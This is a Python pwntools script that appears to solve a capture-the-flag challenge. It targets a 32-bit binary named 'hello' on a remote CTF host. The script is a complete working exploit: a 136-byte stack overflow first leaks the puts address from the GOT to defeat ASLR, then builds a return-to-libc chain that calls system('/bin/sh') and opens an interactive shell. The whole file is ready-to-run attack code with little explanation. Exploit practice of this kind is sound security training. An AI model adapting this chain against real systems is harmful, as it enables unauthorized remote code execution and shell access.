#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['gnome-terminal','-x','sh','-c']

#Setting up pwn env
BIN_NAME = './hello'
DEBUG = True
LOCAL = False
LIBC = './libc.so.6'
HOST =  'chall.csivit.com'
PORT = 30046
ARCH_64 = False
if LIBC:
    LIBC_ELF = ELF(LIBC)

#Exploit goes here
def exploit(r):
    puts_got = 0x0804a024
    puts_plt = 0x080484b0
    main = 0x0804865d
    payload = "A"*136
    payload += p32(puts_plt) + p32(main) + p32(puts_got)
    r.recvline("What's your name?\n")
    r.sendline(payload)
    r.recvline()
    leaked_puts_got =  u32(r.recv(4))
    addrs = int(leaked_puts_got)
    libc_offset = addrs - 0x05f150
    log.success("Leaked remote libc address: " + hex(addrs))
    log.success("Leaked libc offset: " + hex(libc_offset))
    r.recvuntil("What's your name?\n")
    system = libc_offset + 0x03a950
    bin_sh = libc_offset + 0x15910b
    payload = "A"*136 + p32(system) + "AAAA" + p32(bin_sh)
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':

    if ARCH_64:
        context.update(arch='amd64')
    else:
        context.update(arch='i386')

    elf = ELF(BIN_NAME)

    if not LOCAL:
        DEBUG = False
        LOCAL = False
        io = remote(HOST, PORT)
        exploit(io)
    else:
        LOCAL = True
        io = process(BIN_NAME)
        if DEBUG:
            gdb.attach(io)
            log.info('Process Started')
        exploit(io)
